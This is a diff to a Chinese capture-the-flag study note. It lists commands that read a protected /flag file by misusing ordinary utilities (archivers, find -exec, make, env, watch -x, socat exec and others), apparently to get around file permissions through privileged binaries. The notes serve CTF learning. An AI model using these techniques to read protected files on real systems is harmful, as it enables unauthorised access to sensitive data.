@@ -721,9 +721,9 @@ cat xxaa
 
 这个命令将文件按照每行进行分割，分隔到前缀为xx的多个文件之中。
 
-#### gzip、bzip2、zip、tar
+#### gzip、bzip2、zip、tar、ar、cpio、genisoimage
 
-这几个命令就很眼熟了，都是用于压缩和解压的。这几个命令又是如何运用到读取文件的呢？
+这几个命令就很眼熟了，都是用于压缩、备份或解压的。这几个命令又是如何运用到读取文件的呢？
 
 gzip，gzip进行压缩时，会默认不保留原文件，压缩后的文件以`.gz`后缀结尾，同时继承原文件的权限信息。
 
@@ -737,6 +737,125 @@ gzip，gzip进行压缩时，会默认不保留原文件，压缩后的文件以
 gzip /flag
 # -d 进行解压，-c则输出到标准输出，从而显示文件内容
 gzip -d -c /flag.gz
+```
+
+`bzip2`的用法类似，多了一个`-z`参数表示压缩，压缩后文件后缀为`bz2`。
+
+```
+bzip2 -z /flag
+bzip2 -d -c /flag.bz2
+```
+
+`zip`的用法和前面的有一定区别。
+
+```
+zip /flag.zip /flag
+```
+
+压缩之后可以直接读。
+
+![zip](zip.png)
+
+`tar`和zip类似，压缩成`.tar`文件后直接cat读取flag，但是需要注意的是`.tar.gz`就没法读了。
+
+`ar`命令用于建立或修改备存文件，或是从备存文件中抽取文件。
+
+详细的使用方法可以查看 [菜鸟](https://www.runoob.com/linux/linux-comm-ar.html)。
+
+```
+ar ./x.bak /flag
+cat ./x.bak
+```
+
+![ar](ar.png)
+
+`cpio`是用来建立，还原备份档的工具程序，它可以加入，解开 cpio 或 tar 备份档内的文件。
+
+```
+ls /flag | cpio -o
+```
+
+`genisoimage`是一个制作ISO镜像文件的命令。
+
+-sort会指定一个排序指导文件，这样也可以读取/flag
+
+
+```
+genisoimage -sort "/flag"
+```
+
+#### Execute other commands
+
+这些命令可以用于其他命令的执行，从而间接读取flag。
+
+`env`可用于执行其他命令。
+
+```
+env cat /flag
+```
+
+`find`的flag -exec可用于执行其他命令。-exec表示对每个找到的结果执行后续命令，`cat {}`会对每个找到的文件执行cat命令，`{}`会被自动替换为当前找到的文件路径，`\;`表示-exec参数的结束（必须转义分号）
+
+```
+find /flag -exec cat {} \;
+```
+
+`make`，make会执行Makefile中的命令，因此我们可以编写一个Makefile，打印/flag内容。
+
+```Makefile
+cat:
+    cat /flag
+```
+
+ 编写Makefile如上，随后执行`make cat`
+
+`nice`以更改过的优先序来执行程序，如果未指定程序，则会印出目前的排程优先序，内定的 adjustment 为 10，范围为 -20（最高优先序）到 19（最低优先序）。
+
+具体用法参考[nice](https://www.runoob.com/linux/linux-comm-nice.html)。
+
+```
+nice cat /flag
+```
+
+`timeout`可以设定命令的执行结束时间。
+
+```
+timeout 1m cat /flag
+```
+
+`stdbuf` 是一个用于修改标准流缓冲模式和大小的命令。它可以调整标准输入、标准输出和标准错误流的缓冲模式，使数据能够及时输出到下一级管道。
+
+缓冲类型分为三种：
+
+无缓冲：数据立即输出，不进行缓冲。
+
+行缓冲：数据在遇到换行符时输出。
+
+全缓冲：数据在缓冲区满时输出。
+
+```
+stdbuf -i0 cat /flag
+```
+
+`setarch`命令可以设置某个程序运行所需的CPU架构或功能标志。这对于在具有不同CPU架构的系统上运行二进制文件，或测试程序在不同CPU特性下的行为特别有用。`setarch --list`可以查看支持的架构。
+
+```
+setarch x86_64 cat /flag
+```
+
+`watch`可以周期性地执行给定的指令，并将输出结果显示在标准输出设备上。它可以帮助用户监测命令的运行结果，避免手动重复执行命令。
+
+需要注意的是`watch cat /flag`也可以执行cat命令，但会遇到权限不够的情况。这是因为`watch cat`是通过shell执行命令的，相当于`sh -c cat /flag`，权限继承于shell，而`watch -x cat /flag`中，cat以watch的子进程执行，继承了watch的权限。
+
+
+```
+watch -x cat /flag
+```
+
+`socat`是一个网络工具，它可以在两个端口之间建立虚拟通道，将数据从一个端口转发到另一个端口，同时支持很多网络协议。这里将命令执行内容转发到stdout。
+
+```
+socat exec:"cat /flag" stdout
 ```
 
 ### SQL
